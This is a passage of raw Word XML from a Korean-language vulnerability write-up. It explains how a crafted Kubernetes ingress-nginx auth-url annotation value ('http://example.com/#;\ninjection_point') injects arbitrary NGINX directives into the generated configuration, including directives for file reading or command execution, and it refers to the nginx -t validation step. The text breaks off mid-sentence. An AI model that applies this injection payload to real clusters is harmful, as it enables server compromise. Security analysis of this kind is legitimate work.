          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>새로운</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX directive</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행되도록</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>할</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F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F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD55B04" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예를</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>들어</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>아래와</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>같은</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>값을</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> annotation</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입할</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F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F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAFE70E" w14:textId="72470677" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29CFF918" wp14:editId="2A93DCEB">
                <wp:extent cx="5324475" cy="771525"/>
                <wp:effectExtent l="0" t="0" r="28575" b="28575"/>
                <wp:docPr id="124423537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77152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FFDB2" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="23F46803" w14:textId="06F07BBC" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="00F9143F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nginx.ingress.kubernetes.io/auth-url: "</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="00F9143F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http://example.com/#;\</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r w:rsidRPr="00F9143F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ninjection_point"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CFF918" id="_x0000_s1027" style="width:419.25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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="1A3FFDB2" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="23F46803" w14:textId="06F07BBC" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>nginx.ingress.kubernetes.io/auth-url: "</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>http://example.com/#;\</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>ninjection_point"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E388288" w14:textId="1AD9E28C" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이 값이 설정 파일에 반영되면 다음과 같이 변환됩니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A9B487" w14:textId="33757125" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F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lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B825C54" wp14:editId="07CB073E">
                <wp:extent cx="5324475" cy="1254642"/>
                <wp:effectExtent l="0" t="0" r="28575" b="22225"/>
                <wp:docPr id="118358262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1254642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F5D01" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="261FF7E2" w14:textId="3675F8CA" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="00F9143F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set $target http://example.com/#;</w:t>
                            </w:r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proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00F9143F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injection_point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proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00F9143F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proxy_pass</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00F9143F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$</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="00F9143F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target;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825C54" id="_x0000_s1028" style="width:419.25pt;height:9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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="797F5D01" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="261FF7E2" w14:textId="3675F8CA" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>set $target http://example.com/#;</w:t>
                      </w:r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proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>injection_point</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>proxy_pass</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00F9143F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$</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>target;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</w:p>
    <w:p w14:paraId="16D3883D" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이렇게</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>하면</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection_point </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>자리에</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임의의</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX directive(</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>읽기</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>명령</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>등</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>를</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입할</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F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F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F99CA75" w14:textId="4C1E5896" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>특히</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, NGINX</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">(nginx -t) </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>과정에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
